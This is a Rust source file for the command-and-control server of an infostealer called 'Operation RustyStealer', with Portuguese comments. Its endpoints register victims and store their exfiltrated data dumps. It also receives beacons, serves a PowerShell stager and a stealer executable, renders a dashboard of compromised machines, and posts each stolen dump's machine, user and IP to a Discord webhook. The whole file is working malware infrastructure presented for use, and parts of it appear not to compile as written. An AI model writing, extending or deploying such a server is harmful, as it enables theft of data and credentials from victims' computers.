use axum::{
    extract::{Path, Query, State},
    response::{Json, IntoResponse, Html},
    http::StatusCode,
};
use serde_json::json;
use std::sync::Arc;
use chrono::Utc;
use crate::{AppState, crypto};
use crate::models::*;

// Endpoint principal de exfiltração
pub async fn exfil_handler(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<ExfilData>,
) -> impl IntoResponse {
    // Valida API Key (opcional)
    // if api_key != state.config.auth.api_key { return (StatusCode::UNAUTHORIZED, "Invalid API Key"); }
    
    // Registra vítima se não existir
    let victim_id = if payload.victim_id.is_empty() {
        // Nova vítima, registra
        match state.db.register_victim(
            &payload.machine_name,
            &payload.username,
            &payload.ip_address,
            None,
        ).await {
            Ok(id) => id,
            Err(e) => {
                tracing::error!("Failed to register victim: {}", e);
                return (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                    "success": false,
                    "error": "Database error"
                })));
            }
        }
    } else {
        // Vítima existente, atualiza last_seen
        if let Err(e) = state.db.update_victim_last_seen(&payload.victim_id).await {
            tracing::error!("Failed to update last_seen: {}", e);
        }
        payload.victim_id.clone()
    };
    
    // Salva o dump no banco
    match state.db.add_exfil(
        &victim_id,
        &payload.data_type,
        &payload.data,
    ).await {
        Ok(exfil_id) => {
            tracing::info!(
                "[+] Exfil received: {} | {} | {} bytes",
                payload.machine_name,
                payload.data_type,
                payload.data.len()
            );
            
            // Salva em arquivo também (opcional)
            save_to_file(&victim_id, &payload).await;
            
            // Envia notificação pro Discord
            send_discord_notification(&state.config.auth.discord_webhook, &payload).await;
            
            (StatusCode::OK, Json(json!({
                "success": true,
                "id": exfil_id,
                "message": "Data received successfully"
            })))
        }
        Err(e) => {
            tracing::error!("Failed to save exfil: {}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false,
                "error": "Failed to save data"
            })))
        }
    }
}

// Endpoint de beacon (keep-alive)
pub async fn beacon_handler(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<Beacon>,
) -> impl IntoResponse {
    match state.db.add_beacon(&payload.victim_id, &payload.status).await {
        Ok(_) => {
            tracing::debug!("[+] Beacon from: {}", payload.victim_id);
            (StatusCode::OK, Json(json!({
                "success": true,
                "message": "Beacon received"
            })))
        }
        Err(e) => {
            (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false,
                "error": format!("Database error: {}", e)
            })))
        }
    }
}

// Lista todas as vítimas (para dashboard)
pub async fn victims_handler(
    State(state): State<Arc<AppState>>,
) -> impl IntoResponse {
    match state.db.list_victims().await {
        Ok(victims) => {
            Json(json!({
                "success": true,
                "victims": victims
            }))
        }
        Err(e) => {
            (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false,
                "error": format!("Failed to list victims: {}", e)
            })))
        }
    }
}

// Detalhes de uma vítima específica
pub async fn victim_details_handler(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> impl IntoResponse {
    match state.db.get_victim_exfils(&id).await {
        Ok(exfils) => {
            Json(json!({
                "success": true,
                "victim_id": id,
                "exfils": exfils
            }))
        }
        Err(e) => {
            (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false,
                "error": format!("Failed to get victim details: {}", e)
            })))
        }
    }
}

// Download de um dump específico
pub async fn get_exfil_handler(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> impl IntoResponse {
    match state.db.get_exfil_by_id(&id).await {
        Ok(Some(exfil)) => {
            // Decripta os dados antes de enviar
            let decrypted = crypto::aes_decrypt(&exfil.data);
            
            Json(json!({
                "success": true,
                "data_type": exfil.data_type,
                "timestamp": exfil.timestamp,
                "victim": exfil.machine_name,
                "username": exfil.username,
                "ip": exfil.ip_address,
                "data": decrypted
            }))
        }
        Ok(None) => {
            (StatusCode::NOT_FOUND, Json(json!({
                "success": false,
                "error": "Exfil not found"
            })))
        }
        Err(e) => {
            (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false,
                "error": format!("Database error: {}", e)
            })))
        }
    }
}

// Serve payload stages (stager, stealer)
pub async fn payload_handler(
    Path(stage): Path<String>,
) -> impl IntoResponse {
    match stage.as_str() {
        "stage1.ps1" => {
            let payload = include_str!("../payloads/stage1.ps1");
            (StatusCode::OK, [(CONTENT_TYPE, "text/plain")], payload)
        }
        "stealer.exe" => {
            // Serve o binário compilado
            let binary = include_bytes!("../payloads/stealer.exe");
            (StatusCode::OK, [(CONTENT_TYPE, "application/octet-stream")], binary.to_vec())
        }
        _ => {
            (StatusCode::NOT_FOUND, [(CONTENT_TYPE, "text/plain")], "Payload not found")
        }
    }
}

// Dashboard HTML
pub async fn dashboard_handler() -> Html<String> {
    let html = r#"
<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard - RustyStealer</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ffaa;
            padding: 20px;
        }
        h1 { 
            border-bottom: 2px solid #00ffaa;
            padding-bottom: 10px;
            margin-bottom: 30px;
        }
        .victim-card {
            background: #0f1322;
            border: 1px solid #00ffaa33;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            transition: 0.3s;
        }
        .victim-card:hover {
            border-color: #00ffaa;
            box-shadow: 0 0 10px #00ffaa33;
        }
        .victim-name {
            font-size: 1.4em;
            font-weight: bold;
            color: #00ffaa;
        }
        .victim-details {
            color: #88aaff;
            font-size: 0.9em;
            margin-top: 10px;
        }
        .exfil-count {
            display: inline-block;
            background: #00ffaa22;
            padding: 5px 10px;
            border-radius: 20px;
            margin-top: 10px;
        }
        .status-online {
            color: #00ffaa;
        }
        .refresh-btn {
            background: #00ffaa;
            color: #0a0e27;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 20px;
        }
        pre {
            background: #00000066;
            padding: 10px;
            overflow-x: auto;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>🔴 Operation RustyStealer - C2 Dashboard</h1>
    <button class="refresh-btn" onclick="refreshData()">🔄 Refresh Data</button>
    <div id="victims"></div>
    
    <script>
        async function refreshData() {
            const response = await fetch('/victims');
            const data = await response.json();
            
            if (data.success) {
                const container = document.getElementById('victims');
                container.innerHTML = '';
                
                data.victims.forEach(victim => {
                    const card = document.createElement('div');
                    card.className = 'victim-card';
                    card.innerHTML = `
                        <div class="victim-name">💻 ${victim.machine_name}</div>
                        <div class="victim-details">
                            👤 ${victim.username} | 🌐 ${victim.ip_address}<br>
                            🕐 First Seen: ${new Date(victim.first_seen).toLocaleString()}<br>
                            🟢 Last Seen: ${new Date(victim.last_seen).toLocaleString()}
                        </div>
                        <div class="exfil-count">📦 ${victim.total_exfils} dumps collected</div>
                        <button onclick="viewDetails('${victim.id}')">View Details</button>
                    `;
                    container.appendChild(card);
                });
            }
        }
        
        async function viewDetails(victimId) {
            const response = await fetch(`/victim/${victimId}`);
            const data = await response.json();
            
            if (data.success) {
                let details = '📁 Collected Data:\n\n';
                data.exfils.forEach(exfil => {
                    details += `[${exfil.data_type}] - ${new Date(exfil.timestamp).toLocaleString()}\n`;
                });
                alert(details);
            }
        }
        
        refreshData();
        setInterval(refreshData, 10000);
    </script>
</body>
</html>
    "#;
    
    Html(html.to_string())
}

// Helper: salva dump em arquivo
async fn save_to_file(victim_id: &str, payload: &ExfilData) {
    use tokio::fs;
    use std::path::Path;
    
    let dir = format!("./data/victims/{}", victim_id);
    let _ = fs::create_dir_all(&dir).await;
    
    let filename = format!(
        "{}/{}_{}.json",
        dir,
        payload.data_type,
        chrono::Utc::now().timestamp()
    );
    
    let json = serde_json::to_string_pretty(payload).unwrap();
    let _ = fs::write(filename, json).await;
}

// Helper: envia notificação pro Discord
async fn send_discord_notification(webhook: &str, payload: &ExfilData) {
    let client = reqwest::Client::new();
    let message = json!({
        "embeds": [{
            "title": "🎯 New Exfil Received!",
            "color": 0x00ff00,
            "fields": [
                {"name": "Machine", "value": payload.machine_name, "inline": true},
                {"name": "User", "value": payload.username, "inline": true},
                {"name": "IP", "value": payload.ip_address, "inline": true},
                {"name": "Data Type", "value": payload.data_type, "inline": true},
                {"name": "Size", "value": format!("{} bytes", payload.data.len()), "inline": true},
                {"name": "Timestamp", "value": payload.timestamp.to_rfc3339(), "inline": false}
            ],
            "footer": {"text": "Operation RustyStealer - C2 Server"}
        }]
    });
    
    let _ = client.post(webhook).json(&message).send().await;
}